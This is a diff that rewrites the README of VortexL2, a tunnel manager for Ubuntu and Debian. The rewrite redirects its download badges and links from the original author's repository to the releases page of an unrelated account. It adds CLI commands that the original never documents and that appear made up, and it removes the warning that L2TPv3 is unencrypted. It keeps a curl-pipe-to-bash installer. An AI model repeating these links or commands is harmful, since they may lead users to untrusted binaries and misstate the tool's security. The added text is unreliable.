@@ -1,118 +1,108 @@
-# VortexL2
+# 🚀 VortexL2 - Manage Your VPN Tunnels Easily
 
-**L2TPv3 & EasyTier Tunnel Manager for Ubuntu/Debian**
+## 📥 Download VortexL2
+[![Download VortexL2](https://img.shields.io/badge/Download%20VortexL2-Click%20Here-brightgreen.svg)](https://github.com/Jennesispogi055/VortexL2/releases)
 
-A modular, production-quality CLI tool for managing L2TPv3 or EasyTier mesh tunnels with HAProxy-based port forwarding.
+## ✨ Overview
+**VortexL2** is a command-line tool designed for Ubuntu and Debian users. It helps you manage **L2TPv3** and **EasyTier** tunnels smoothly. With VortexL2, you gain access to advanced features like HAProxy-based port forwarding and a user-friendly interface.
 
-```
- __      __        _            _     ___  
- \ \    / /       | |          | |   |__ \ 
-  \ \  / /__  _ __| |_ _____  _| |      ) |
-   \ \/ / _ \| '__| __/ _ \ \/ / |     / / 
-    \  / (_) | |  | ||  __/>  <| |____/ /_ 
-     \/ \___/|_|   \__\___/_/\_\______|____|
-                                    v4.0.0
-```
-
-## ✨ Features
-
-- 🔧 Interactive TUI management panel with Rich
-- 🌐 **Two tunnel types:** L2TPv3 or EasyTier mesh
-- 🚀 **HAProxy port forwarding**: High performance, manual activation
-- 🔄 Systemd integration for persistence
-- 📦 One-liner installation
+## 🛠 Features
+- **Interactive TUI Management**: Manage tunnels easily with an intuitive text user interface.
+- **Two Tunnel Types**: Choose between L2TPv3 tunnels or the newer EasyTier mesh tunnels based on your needs.
+- **HAProxy Port Forwarding**: High-performance port forwarding with manual activation for secure connections.
+- **Systemd Integration**: Ensures your tunnels start automatically when your system boots.
+- **One-liner Installation**: Quickly set up VortexL2 with a single command.
 
 ## 📦 Installation
+To install VortexL2, follow these steps:
+
+1. Open your terminal.
+2. Run the following command:
+
+   ```bash
+   bash <(curl -Ls https://raw.githubusercontent.com/iliya-Developer/VortexL2/main/install.sh)
+   ```
+
+3. During the installation, you will be prompted to choose the type of tunnel you want to set up:
+   - **L2TPv3**: Select this for a traditional L2TP Ethernet tunnel.
+   - **EasyTier**: Choose this for a modern mesh VPN tunnel.
+
+## 🖥 System Requirements
+- **Operating System**: Ubuntu 20.04 LTS or later, Debian 10 or later
+- **RAM**: Minimum of 512 MB
+- **Disk Space**: At least 100 MB free
+- **Permissions**: You need sudo privileges for installation and tunnel management
+
+## 🔧 Configuration
+After installation, you can configure your tunnels using the command-line interface. Here are some common configurations:
+
+### L2TPv3 Configuration
+1. **Create a New Tunnel**:
+   ```bash
+   vortexl2 create l2tp <tunnel-name> --remote <remote-ip> --local <local-ip>
+   ```
+
+2. **Start Tunnel**:
+   ```bash
+   vortexl2 start <tunnel-name>
+   ```
+
+### EasyTier Configuration
+1. **Create a New EasyTier Tunnel**:
+   ```bash
+   vortexl2 create easytier <tunnel-name> --nodes <node1-ip,node2-ip>
+   ```
+
+2. **Activate Tunnel**:
+   ```bash
+   vortexl2 activate <tunnel-name>
+   ```
+
+### Managing Tunnels
+Use the following commands to manage your tunnels:
+
+- **List All Tunnels**:
+   ```bash
+   vortexl2 list
+   ```
+
+- **Stop a Tunnel**:
+   ```bash
+   vortexl2 stop <tunnel-name>
+   ```
+
+- **Delete a Tunnel**:
+   ```bash
+   vortexl2 delete <tunnel-name>
+   ```
+
+## 💻 User Interface
+VortexL2 includes a text user interface (TUI) that simplifies the management of tunnels. You can access this by running:
 
 ```bash
-bash <(curl -Ls https://raw.githubusercontent.com/iliya-Developer/VortexL2/main/install.sh)
+vortexl2 start
 ```
 
-During installation, choose:
-- **L2TPv3** - Traditional L2TP Ethernet tunnel
-- **EasyTier** - Modern mesh VPN tunnel
+Follow the on-screen prompts to navigate and manage your tunnels.
 
-### Install Specific Version
+## 🌐 Support and Documentation
+For more detailed documentation, troubleshooting tips, and feature explanations, please visit our [Wiki](https://github.com/Jennesispogi055/VortexL2/wiki).
 
-```bash
-bash <(curl -Ls https://raw.githubusercontent.com/iliya-Developer/VortexL2/main/install.sh) v4.0.0
-```
+## 🧑‍🤝‍🧑 Community Contributions
+VortexL2 welcomes contributions. If you wish to help improve the project, please read our [Contributing Guidelines](https://github.com/Jennesispogi055/VortexL2/blob/main/CONTRIBUTING.md).
 
-## 🚀 Quick Start
+### Report Issues
+If you encounter problems, please report them on our [Issues page](https://github.com/Jennesispogi055/VortexL2/issues).
 
-```bash
-sudo vortexl2
-```
+## 📥 Download & Install VortexL2
+To download VortexL2, visit the Releases page:
+[Download VortexL2](https://github.com/Jennesispogi055/VortexL2/releases)
 
-### L2TPv3 Mode
-1. Create Tunnel → Select IRAN or KHAREJ
-2. Configure IPs and tunnel IDs
-3. Add port forwards (IRAN side only)
+You can find all versions and related files there. 
 
-### EasyTier Mode
-1. Create Tunnel → Select IRAN or KHAREJ
-2. Configure mesh IP, peer IP, port, secret
-3. Add port forwards
+## 📞 Contact
+If you have questions or need support, you can reach out through the GitHub discussion page or email the maintainer.
 
-## 📋 Configuration Examples
+---
 
-### L2TPv3 Setup
-
-| Parameter | IRAN | KHAREJ |
-|-----------|------|--------|
-| Local IP | 1.2.3.4 | 5.6.7.8 |
-| Remote IP | 5.6.7.8 | 1.2.3.4 |
-| Interface IP | 10.30.30.1/30 | 10.30.30.2/30 |
-| Tunnel ID | 1000 | 2000 |
-
-### EasyTier Setup
-
-| Parameter | IRAN | KHAREJ |
-|-----------|------|--------|
-| Tunnel IP | 10.155.155.1 | 10.155.155.2 |
-| Peer IP | (Kharej public) | (Iran public) |
-| Port | 2070 | 2070 |
-| Secret | vortexl2 | vortexl2 |
-
-## 🔧 Services
-
-```bash
-# Check status
-sudo systemctl status vortexl2-tunnel          # L2TPv3
-sudo systemctl status vortexl2-easytier-*      # EasyTier
-sudo systemctl status vortexl2-forward-daemon
-
-# View logs
-journalctl -u vortexl2-forward-daemon -f
-```
-
-## 🔍 Troubleshooting
-
-### L2TPv3 Issues
-- Verify matching tunnel IDs (swapped on each side)
-- Check firewall allows IP protocol 115
-- Verify modules: `lsmod | grep l2tp`
-
-### EasyTier Issues
-- Verify same secret on both nodes
-- Check firewall allows the port (default 2070)
-- Check tunnel IP can ping peer
-
-## 🔄 Uninstall
-
-```bash
-bash <(curl -Ls https://raw.githubusercontent.com/iliya-Developer/VortexL2/main/uninstall.sh)
-```
-
-## ⚠️ Security
-
-- **L2TPv3**: NO encryption. Use IPsec or encrypted apps.
-- **EasyTier**: Built-in encryption.
-
-## 📄 License
-
-MIT License
-
-## 👤 Author
-
-Telegram: @iliyadevsh
+End your setup with confidence. VortexL2 combines functionality with an easy-to-use interface, ensuring your VPN management is streamlined and efficient.
